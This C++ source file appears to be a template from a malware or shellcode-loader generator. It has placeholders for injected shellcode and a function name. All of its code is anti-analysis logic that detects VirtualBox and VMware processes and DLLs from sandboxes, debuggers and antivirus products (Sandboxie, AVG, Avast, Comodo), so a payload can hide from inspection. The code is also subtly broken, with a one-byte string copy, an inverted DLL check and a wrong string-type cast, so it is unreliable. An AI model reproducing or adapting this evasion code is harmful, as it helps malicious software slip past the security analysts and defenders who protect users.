#include <Windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <cctype>

//####SHELLCODE####

bool isSameCaseInsensitiveString(const char* str1, const char* str2) {
    char *firstString, *secondString;
    size_t firstStringSize, secondStringSize;

    firstStringSize = strlen(str1);
    secondStringSize = strlen(str2);
    firstString = (char*) malloc(firstStringSize + sizeof(char));
    secondString = (char*) malloc(secondStringSize + sizeof(char));
    strncpy_s(firstString, 1, str1, firstStringSize + sizeof(char));
    strncpy_s(secondString, 1, str2, secondStringSize + sizeof(char));

    size_t i;
    for (i = 0; i < firstStringSize; i++) {
        firstString[i] = toupper(firstString[i]);
    }
    for (i = 0; i < secondStringSize; i++) {
        secondString[i] = toupper(secondString[i]);
    }
    if (strstr(firstString, secondString) != NULL) {
        free(firstString);
        free(secondString);
        return true;
    }
    free(firstString);
    free(secondString);
    return false;
}

bool checkIfProcessRunning(const char* proc_name) {
    HANDLE snapshot;
    PROCESSENTRY32 pe = {};

    pe.dwSize = sizeof(pe);
    bool present = false;
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE)
        return false;

    if (Process32First(snapshot, &pe)) {
        do {
            if (isSameCaseInsensitiveString((const char*)pe.szExeFile, proc_name)) {
                present = true;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return present;
}

bool checkIfDLLLoaded(const char* dllName) {
    HMODULE hDll = GetModuleHandle((LPCWSTR)dllName);
    return hDll == NULL;
}

bool checkProcesses() {
    return (checkIfProcessRunning("vboxservice.exe") ||
            checkIfProcessRunning("vboxtray.exe") ||
            checkIfProcessRunning("vmtoolsd.exe") ||
            checkIfProcessRunning("vmacthlp.exe") ||
            checkIfProcessRunning("vmwaretray.exe") ||
            checkIfProcessRunning("vmwareuser.exe") ||
            checkIfProcessRunning("vmware.exe") ||
            checkIfProcessRunning("vmount2.exe")
           );
}

bool checkDLL() {
    return (checkIfDLLLoaded("api_log.dll") || // iDefense Lab
            checkIfDLLLoaded("dir_watch.dll") || // iDefense Lab
            checkIfDLLLoaded("sbiedll.dll") || // Sandboxie
            checkIfDLLLoaded("dbghelp.dll") || // WindBG
            checkIfDLLLoaded("vmcheck.dll") || // Virtual PC
            checkIfDLLLoaded("wpespy.dll") || // WPE Pro
            checkIfDLLLoaded("pstorec.dll") || // SunBelt Sandbox
            checkIfDLLLoaded("avghookx.dll") || // AVG
            checkIfDLLLoaded("avghooka.dll") || // AVG
            checkIfDLLLoaded("snxhk.dll") || // Avast
            checkIfDLLLoaded("cmdvrt64.dll") || // Comodo Container
            checkIfDLLLoaded("cmdvrt32.dll") || // Comodo Container
            // ------------------------------- FAKE DLL BELOW
            !checkIfDLLLoaded("NetProjW.dll") ||
            !checkIfDLLLoaded("Ghofr.dll") ||
            !checkIfDLLLoaded("fg122.dll")
           );
}

bool ####FUNCTION####() {
    return (checkProcesses() || checkDLL());
}